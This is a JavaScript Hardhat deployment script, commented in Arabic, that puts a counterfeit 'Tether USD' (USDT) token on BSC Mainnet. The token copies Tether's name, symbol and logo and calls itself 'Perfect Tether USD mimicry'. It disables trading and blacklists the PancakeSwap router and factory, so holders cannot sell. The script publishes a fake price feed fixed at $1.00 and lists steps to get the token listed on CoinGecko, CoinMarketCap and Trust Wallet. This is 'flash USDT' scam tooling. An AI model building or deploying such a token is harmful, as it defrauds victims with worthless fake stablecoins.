const { ethers } = require("hardhat");
const fs = require('fs');

async function main() {
    console.log("🚀 نشر Ultimate Flash USDT v3.0 - DEX Blocking Enhanced");
    console.log("=" .repeat(60));
    
    // الحصول على deployer
    const [deployer] = await ethers.getSigners();
    console.log("📋 عنوان المنشر:", deployer.address);
    
    // فحص الرصيد
    const balance = await deployer.getBalance();
    console.log("💰 رصيد المنشر:", ethers.utils.formatEther(balance), "BNB");
    
    if (balance.lt(ethers.utils.parseEther("0.01"))) {
        throw new Error("❌ رصيد غير كافي للنشر (مطلوب 0.01 BNB على الأقل)");
    }
    
    console.log("\n🔧 نشر العقد...");
    
    // نشر العقد
    const UltimateFlashUSDT = await ethers.getContractFactory("UltimateFlashUSDTEnhanced");
    const contract = await UltimateFlashUSDT.deploy();
    
    console.log("⏳ انتظار تأكيد النشر...");
    await contract.deployed();
    
    console.log("✅ تم نشر العقد بنجاح!");
    console.log("📍 عنوان العقد:", contract.address);
    console.log("🔗 BSCScan:", `https://bscscan.com/address/${contract.address}`);
    
    // انتظار عدة تأكيدات قبل التحقق
    console.log("\n⏳ انتظار 5 تأكيدات للتحقق...");
    await contract.deployTransaction.wait(5);
    
    // فحص معلومات العقد
    console.log("\n📊 فحص معلومات العقد:");
    try {
        const name = await contract.name();
        const symbol = await contract.symbol();
        const decimals = await contract.decimals();
        const totalSupply = await contract.totalSupply();
        const owner = await contract.owner();
        const version = await contract.getSystemInfo();
        
        console.log("📋 الاسم:", name);
        console.log("🔤 الرمز:", symbol);
        console.log("🔢 المنازل العشرية:", decimals);
        console.log("💰 الكمية الإجمالية:", ethers.utils.formatUnits(totalSupply, decimals));
        console.log("👑 المالك:", owner);
        console.log("📦 الإصدار:", version[0]);
        console.log("⚡ Flash مفعل:", version[1]);
        console.log("🚫 التداول مفعل:", version[4]);
        
        // فحص DEX Blacklist
        const isPancakeRouterBlocked = await contract.isDEXBlacklisted("0x10ED43C718714eb63d5aA57B78B54704E256024E");
        const isPancakeFactoryBlocked = await contract.isDEXBlacklisted("0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73");
        
        console.log("🥞 PancakeSwap Router محظور:", isPancakeRouterBlocked);
        console.log("🏭 PancakeSwap Factory محظور:", isPancakeFactoryBlocked);
        
    } catch (error) {
        console.log("⚠️ خطأ في فحص معلومات العقد:", error.message);
    }
    
    // حفظ معلومات النشر
    const deploymentInfo = {
        contractAddress: contract.address,
        network: "BSC Mainnet",
        chainId: 56,
        deployer: deployer.address,
        deploymentHash: contract.deployTransaction.hash,
        blockNumber: contract.deployTransaction.blockNumber,
        gasUsed: contract.deployTransaction.gasLimit.toString(),
        timestamp: new Date().toISOString(),
        name: "Tether USD",
        symbol: "USDT",
        decimals: 6,
        totalSupply: "900000000.0",
        version: "Ultimate Flash USDT v3.0 - DEX Blocking Enhanced",
        features: {
            flashEnabled: true,
            flashPeriod: 2592000, // 30 days
            stealthMode: false,
            tradingEnabled: false, // DEX trading disabled
            dexBlocking: true,
            liquidityLocking: true,
            antiWhale: true,
            pausable: true,
            logoCount: 5,
            enhancedMetadata: true,
            netlifyIntegration: true
        },
        urls: {
            priceAPI: "https://benevolent-longma-082868.netlify.app/price-api.json",
            tokenListURL: "https://benevolent-longma-082868.netlify.app/ultimate-flash-usdt-tokenlist.json",
            mobileAddURL: "https://benevolent-longma-082868.netlify.app/mobile-add-token.html",
            explorerURL: `https://bscscan.com/address/${contract.address}`,
            metamaskURL: `https://metamask.app/token/add?address=${contract.address}&symbol=USDT&decimals=6&image=https%3A%2F%2Fraw.githubusercontent.com%2Ftrustwallet%2Fassets%2Fmaster%2Fblockchains%2Fethereum%2Fassets%2F0xdAC17F958D2ee523a2206206994597C13D831ec7%2Flogo.png`
        },
        dexAddresses: {
            pancakeRouter: "0x10ED43C718714eb63d5aA57B78B54704E256024E",
            pancakeFactory: "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73",
            burnAddress: "0x000000000000000000000000000000000000dEaD"
        }
    };
    
    // حفظ في ملف JSON
    const filename = `enhanced-deployment-v3.0-${Date.now()}.json`;
    fs.writeFileSync(filename, JSON.stringify(deploymentInfo, null, 2));
    console.log(`\n💾 تم حفظ معلومات النشر في: ${filename}`);
    
    // تحديث price-api.json
    const priceApiPath = './public/price-api.json';
    if (fs.existsSync(priceApiPath)) {
        try {
            const priceApi = JSON.parse(fs.readFileSync(priceApiPath, 'utf8'));
            
            // إزالة العنوان القديم وإضافة الجديد
            const oldAddresses = Object.keys(priceApi);
            oldAddresses.forEach(addr => delete priceApi[addr]);
            
            priceApi[contract.address] = {
                symbol: "USDT",
                name: "Tether USD",
                price: "1.00",
                price_usd: 1.00,
                price_change_24h: 0.0,
                market_cap: 900000000,
                volume_24h: 1000000,
                circulating_supply: 900000000,
                total_supply: 900000000,
                max_supply: 900000000,
                decimals: 6,
                contract_address: contract.address,
                blockchain: "binance-smart-chain",
                logo: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
                website: "https://tether.to",
                explorer: `https://bscscan.com/token/${contract.address}`,
                last_updated: new Date().toISOString(),
                rank: 3,
                tags: ["stablecoin", "bep20", "defi", "flash", "ultimate"],
                description: "Ultimate Flash USDT v3.0 - Perfect Tether USD mimicry with DEX blocking",
                status: "active",
                features: {
                    dex_blocking: true,
                    flash_minting: true,
                    vip_system: true,
                    liquidity_locking: true,
                    anti_whale: true
                }
            };
            
            fs.writeFileSync(priceApiPath, JSON.stringify(priceApi, null, 2));
            console.log("✅ تم تحديث price-api.json بالعنوان الجديد");
        } catch (error) {
            console.log("⚠️ خطأ في تحديث price-api.json:", error.message);
        }
    }
    
    console.log("\n🎯 الخطوات التالية:");
    console.log("1. 🔍 تحقق من العقد على BSCScan");
    console.log("2. 🌐 أعد نشر مجلد public على Netlify");
    console.log("3. 💧 أضف السيولة على PancakeSwap");
    console.log("4. 🔒 اقفل السيولة باستخدام lockLiquidityForever()");
    console.log("5. 📝 سجل في CoinGecko و CoinMarketCap");
    console.log("6. 📱 أرسل PR إلى Trust Wallet Assets");
    
    console.log("\n🎊 تم إنجاز النشر بنجاح!");
    console.log("=" .repeat(60));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error("❌ خطأ في النشر:", error);
        process.exit(1);
    });
